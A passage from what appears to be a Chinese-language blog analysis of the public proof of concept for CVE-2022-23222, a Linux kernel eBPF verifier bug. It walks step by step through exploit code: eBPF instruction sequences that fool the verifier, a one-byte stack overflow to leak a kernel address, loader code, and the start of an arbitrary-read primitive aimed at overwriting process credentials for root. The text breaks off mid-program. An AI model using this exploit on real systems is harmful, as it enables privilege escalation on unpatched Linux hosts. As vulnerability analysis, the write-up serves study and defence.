<h2 id="四、POC分析"><a href="#四、POC分析" class="headerlink" title="四、POC分析"></a>四、POC分析</h2><p>POC 地址为：https://github.com/tr3ee/CVE-2022-23222</p>
<p>漏洞整体利用思路是通过欺骗 eBPF verifier 泄露内核地址，并实现内核任意地址读、写原语，通过任意读原语搜索进程 cred 所在地址，通过任意写原语修改进程 cred 以实现提权。</p>
<h3 id="4-1-前置准备"><a href="#4-1-前置准备" class="headerlink" title="4.1 前置准备"></a>4.1 前置准备</h3><p>创建 2 个 eBPF map ，类型分别为 BPF_MAP_TYPE_ARRAY 及 BPF_MAP_TYPE_RINGBUF。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ret = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(u32), PAGE_SIZE, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">WARNF(<span class="string">"Failed to create comm map: %d (%s)"</span>, ret, strerror(-ret));</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">ctx-&gt;comm_fd = ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ret = bpf_create_map(BPF_MAP_TYPE_RINGBUF, <span class="number">0</span>, <span class="number">0</span>, PAGE_SIZE)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">WARNF(<span class="string">"Could not create ringbuf map: %d (%s)"</span>, ret, strerror(-ret));</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">ctx-&gt;ringbuf_fd = ret;</span><br></pre></td></tr></table></figure>

<p>前者在 POC 中的作用为：</p>
<ol>
<li>和内核交换数据。</li>
<li>泄露其元素的地址。</li>
</ol>
<p>后者的作用则为：</p>
<ol>
<li>和内核交换数据。</li>
<li>通过 bpf_ringbuf_reserve 辅助函数获取 PTR_TO_MEM_OR_NULL 类型指针 。</li>
</ol>
<h3 id="4-2-泄露内核地址"><a href="#4-2-泄露内核地址" class="headerlink" title="4.2 泄露内核地址"></a>4.2 泄露内核地址</h3><p>泄露内核地址的方法为构造特定的 eBFP 程序以利用前述漏洞。</p>
<p>先将 r1 保存到 r9 。r1 在进入 eBPF 程序之前被内核初始化为指向 skb 的指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r9 = r1</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_9, BPF_REG_1)</span><br></pre></td></tr></table></figure>

<p>获取 array 指针，保存在 r0 。调试发现，array 指针都是 0xFFFF…10 这种格式。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r0 = bpf_lookup_elem(ctx-&gt;comm_fd, 0)</span></span><br><span class="line">BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;comm_fd)</span><br><span class="line">BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-8</span>, <span class="number">0</span>)</span><br><span class="line">BPF_MOV64_REG(BPF_REG_2, BPF_REG_10)</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-4</span>)</span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem)</span><br></pre></td></tr></table></figure>

<p>上一步获取的 r0 类型为 PTR_TO_MAP_VALUE_OR_NULL 。进行以下判断后，在 false 分支 r0 类型就变成 PTR_TO_MAP_VALUE。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// if (r0 == NULL) exit(1)</span></span><br><span class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">1</span>)</span><br><span class="line">BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure>

<p>将 array 指针保存进 r8。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r8 = r0</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_8, BPF_REG_0)</span><br></pre></td></tr></table></figure>

<p>调用 bpf_ringbuf_reserve 函数，请求 PAGE_SIZE 的 ringbuf 内存，返回值为 PTR_TO_MEM_OR_NULL 类型指针，属于漏洞中没有过滤的指针类型。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r0 = bpf_ringbuf_reserve(ctx-&gt;ringbuf_fd, PAGE_SIZE, 0)</span></span><br><span class="line">BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;ringbuf_fd)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_2, PAGE_SIZE)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_3, <span class="number">0x00</span>)</span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_ringbuf_reserve)</span><br></pre></td></tr></table></figure>

<p>复制 r0 到 r1 ，r1 的类型变为 PTR_TO_MEM_OR_NULL ，id 也变成 r0 的 id 。这里提一下，verifier 会维护 eBPF 寄存器的 id 属性，用于追踪指针类型的来源。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r0 = r1</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_1, BPF_REG_0)</span><br></pre></td></tr></table></figure>

<p>之后，r1 自身加 1。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r1 = r1 + 1</span></span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>参考 adjust_ptr_min_max_vals 函数的代码，在指针加减操作中，目标寄存器的 id 和类型会变成指针寄存器的 id 和类型。由于在上一步中  r1 既是目标寄存器也是指针寄存器，其 id 和类型保持不变。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_ptr_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="function"><span class="params">				   struct bpf_insn *insn,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">const</span> struct bpf_reg_state *ptr_reg,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">const</span> struct bpf_reg_state *off_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* In case of 'scalar += pointer', dst_reg inherits pointer type and id.</span></span><br><span class="line"><span class="comment">	 * The id may be overwritten later if we create a new variable offset.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	dst_reg-&gt;type = ptr_reg-&gt;type;</span><br><span class="line">	dst_reg-&gt;id = ptr_reg-&gt;id;</span><br><span class="line">	</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查 r0 是否为 NULL 。事实上，r0 不为 NULL 的情况不可能发生。ringbuf 的大小虽然为 PAGE_SIZE ，但其中一部分用于存储关于 ringbuf 的结构体，剩下的才用于存储数据。因此，请求保留 PAGE_SIZE 的内存不可能实现。经过此步骤后，r0 的类型变为 SCALAR_VALUE ，其值为 0 。那么，与 r0 具有相同 id 的 r1 的类型和值又会如何变化呢？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// if (r0 != NULL) &#123; ringbuf_discard(r0, 1); exit(2); &#125;</span></span><br><span class="line">BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, <span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">BPF_MOV64_REG(BPF_REG_1, BPF_REG_0)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_2, <span class="number">1</span>)</span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_ringbuf_discard)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">2</span>)</span><br><span class="line">BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure>

<p>check_cond_jmp_op 是 verifier 中检查 JMP 指令的函数，当 JMP 指令的条件是 *OR_NULL 类型指针和 0 比较时，会通过 mark_ptr_or_null_regs 函数改变不同分支中寄存器的类型。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_cond_jmp_op</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="function"><span class="params">			     struct bpf_insn *insn, <span class="keyword">int</span> *insn_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* detect if R == 0 where R is returned from bpf_map_lookup_elem().</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">NOTE:</span> these optimizations below are related with pointer comparison</span></span><br><span class="line"><span class="comment">	 *       which will never be JMP32.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!is_jmp32 &amp;&amp; BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">	    insn-&gt;imm == <span class="number">0</span> &amp;&amp; (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">	    reg_type_may_be_null(dst_reg-&gt;type)) &#123;</span><br><span class="line">		<span class="comment">/* Mark all identical registers in each branch as either</span></span><br><span class="line"><span class="comment">		 * safe or unknown depending R == 0 or R != 0 conditional.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		mark_ptr_or_null_regs(this_branch, insn-&gt;dst_reg,</span><br><span class="line">				      opcode == BPF_JNE);</span><br><span class="line">		mark_ptr_or_null_regs(other_branch, insn-&gt;dst_reg,</span><br><span class="line">				      opcode == BPF_JEQ);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mark_ptr_or_null_regs 函数又调用了 __mark_ptr_or_null_regs 函数，在后者中，所有相同 id 的寄存器都会被 mark_ptr_or_null_reg 函数进行相同的处理。因此，后续 r1 也会变成 SCALAR_VALUE 类型，且 verifier 认为其值为 0 。然而，事实上 r1 的值为 1 。这就是漏洞所在，PTR_TO_MEM_OR_NULL 类型的指针无论经过加减运算变成何值，只要经过是否为 NULL 的判断，在其中一个分支 verifier 都会认为其值为 0 。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __mark_ptr_or_null_regs(struct bpf_func_state *state, u32 id,</span><br><span class="line">				    <span class="keyword">bool</span> is_null)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_BPF_REG; i++)</span><br><span class="line">		mark_ptr_or_null_reg(state, &amp;state-&gt;regs[i], id, is_null);</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mark_ptr_or_null_reg</span><span class="params">(struct bpf_func_state *state,</span></span></span><br><span class="line"><span class="function"><span class="params">				 struct bpf_reg_state *reg, u32 id,</span></span></span><br><span class="line"><span class="function"><span class="params">				 <span class="keyword">bool</span> is_null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">if</span> (WARN_ON_ONCE(reg-&gt;smin_value || reg-&gt;smax_value ||</span><br><span class="line">				 !tnum_equals_const(reg-&gt;var_off, <span class="number">0</span>) ||</span><br><span class="line">				 reg-&gt;off)) &#123;</span><br><span class="line">			__mark_reg_known_zero(reg);</span><br><span class="line">			reg-&gt;off = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (is_null) &#123;</span><br><span class="line">			reg-&gt;type = SCALAR_VALUE;</span><br><span class="line">		&#125;</span><br><span class="line">   </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着，将 r1+8 保存到 r7 。verifier 认为 r7 值为 8 ，实际上 r7 值为 9 。再将 array 指针 r8 加上 0xE0 的值保存到 r10-8 处，之所以加上 0xE0 是为了泄露更多数据，后面会补充说明。</p>
<p><img src="images/01.jpg" alt></p>
<p>通过 bpf_skb_load_bytes_relative 向 r10-16 写入 r7 个字节，即 9 个字节，溢出了 1 个字节。所写入的数据是可控的，可在用户态通过写入 socket 传递进内核态。在这里将控制写入数据为全零数据，即 r10-8 处的字节会被 0x00 覆盖。</p>
<p><img src="images/02.jpg" alt></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r7 = r1 + 8</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_7, BPF_REG_1)</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// r6 = r8 - 0xE0</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_6, BPF_REG_8)</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, <span class="number">0xE0</span>)</span><br><span class="line"><span class="comment">// *(u64 *)(r10 - 8) = r6</span></span><br><span class="line">BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_6, <span class="number">-8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里会将r10-16后r7个字节置零。</span></span><br><span class="line"><span class="comment">// r0 = bpf_skb_load_bytes_relative(r9, 0, r10-16, r7, 0)</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_1, BPF_REG_9)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>)</span><br><span class="line">BPF_MOV64_REG(BPF_REG_3, BPF_REG_10)</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-16</span>)</span><br><span class="line">BPF_MOV64_REG(BPF_REG_4, BPF_REG_7)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_5, <span class="number">1</span>)</span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes_relative)</span><br></pre></td></tr></table></figure>

<p>将栈上的 array 指针取出，并减去 0xE0 ，与前面对应，结果保存进 r6 。一加一减，verifier会认为 r6 仍为 array 指针，即等于 0xFFFF…10 。而实际上，r6 等于 0xFFFF…10 - 0xE0 。这里可以选择加减 0x10 ~ 0xE0 ，选择 0xE0 泄露的数据较多。接着，将 r6 所指向的 PAGE_SIZE 字节数据复制到 array 指针处，实现信息泄露。调试发现，泄露的数据中就包含 array 指针，在 0xFFFF…10 - 0x50 处。</p>
<p><img src="images/03.jpg" alt></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r6 = *(u64 *)(r10 - 8) - 0xE0</span></span><br><span class="line">BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, <span class="number">-8</span>)</span><br><span class="line">BPF_ALU64_IMM(BPF_SUB, BPF_REG_6, <span class="number">0xE0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将r6所指向的4096字节数据写入array map，实现信息泄露。</span></span><br><span class="line"><span class="comment">// 调试发现，r6+0xa0处为array map的地址。</span></span><br><span class="line"><span class="comment">// map_update_elem(ctx-&gt;comm_fd, 0, r6, 0)</span></span><br><span class="line">BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;comm_fd)</span><br><span class="line">BPF_MOV64_REG(BPF_REG_2, BPF_REG_8)</span><br><span class="line">BPF_MOV64_REG(BPF_REG_3, BPF_REG_6)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_4, <span class="number">0</span>)</span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_update_elem)</span><br></pre></td></tr></table></figure>

<p>构造好程序后，就可将其加载进内核，attach 到 socket 上，向 socket 写入全零数据以覆盖栈上的 array 指针，再从 array map 中获取泄露的数据，从中找出 array 指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> prog = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insn, <span class="keyword">sizeof</span>(insn) / <span class="keyword">sizeof</span>(insn[<span class="number">0</span>]), <span class="string">""</span>);</span><br><span class="line"><span class="keyword">if</span> (prog &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    WARNF(<span class="string">"Could not load program(do_leak):\n %s"</span>, bpf_log_buf);</span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">abort</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> err = bpf_prog_skb_run(prog, ctx-&gt;bytes, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">    WARNF(<span class="string">"Could not run program(do_leak): %d (%s)"</span>, err, strerror(err));</span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">abort</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> key = <span class="number">0</span>;</span><br><span class="line">err = bpf_lookup_elem(ctx-&gt;comm_fd, &amp;key, ctx-&gt;bytes);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">    WARNF(<span class="string">"Could not lookup comm map: %d (%s)"</span>, err, strerror(err));</span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">abort</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u64 array_map = (u64)ctx-&gt;ptrs[<span class="number">20</span>] &amp; (~<span class="number">0xFF</span>L);</span><br><span class="line"><span class="keyword">if</span> ((array_map&amp;<span class="number">0xFFFFF00000000000</span>) != <span class="number">0xFFFF800000000000</span>) &#123;</span><br><span class="line">    WARNF(<span class="string">"Could not leak array map: got %p"</span>, (<span class="keyword">kaddr_t</span>)array_map);</span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">abort</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">int</span></span><br><span class="line">bpf_prog_skb_run(<span class="keyword">int</span> prog_fd, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> err, socks[<span class="number">2</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> errno;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF,</span><br><span class="line">                    &amp;prog_fd, <span class="keyword">sizeof</span>(prog_fd)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err = errno;</span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">abort</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">write</span>(socks[<span class="number">1</span>], data, <span class="built_in">size</span>) != <span class="built_in">size</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">abort</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">abort</span>:</span><br><span class="line">    <span class="built_in">close</span>(socks[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">close</span>(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-3-构造任意读、写原语"><a href="#4-3-构造任意读、写原语" class="headerlink" title="4.3 构造任意读、写原语"></a>4.3 构造任意读、写原语</h3><p>接下来构造的 eBPF 程序和上一程序及其类似，因此通过添加注释的方式进行说明。</p>
<p>实现任意读原语的 eBPF 程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">arbitrary_read</span>[] = &#123;</span></span><br><span class="line">    <span class="comment">// 保存r1，r1被内核初始化为指向skb的指针。</span></span><br><span class="line">    <span class="comment">// r9 = r1</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 获取array指针，r0类型为PTR_TO_MAP_VALUE_OR_NULL。</span></span><br><span class="line">    <span class="comment">// r0 = bpf_lookup_elem(ctx-&gt;comm_fd, 0)</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;comm_fd),</span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-8</span>, <span class="number">0</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-4</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 必需的判断，令false分支的r0变成PTR_TO_MAP_VALUE类型。</span></span><br><span class="line">    <span class="comment">// if (r0 == NULL) exit(1)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 将array指针保存进r8。</span></span><br><span class="line">    <span class="comment">// r8 = r0</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 获取PTR_TO_MEM_OR_NULL类型指针，保存在r0。</span></span><br><span class="line">    <span class="comment">// r0 = bpf_ringbuf_reserve(ctx-&gt;ringbuf_fd, PAGE_SIZE, 0)</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;ringbuf_fd),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, PAGE_SIZE),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_3, <span class="number">0x00</span>),</span><br><span class="line">    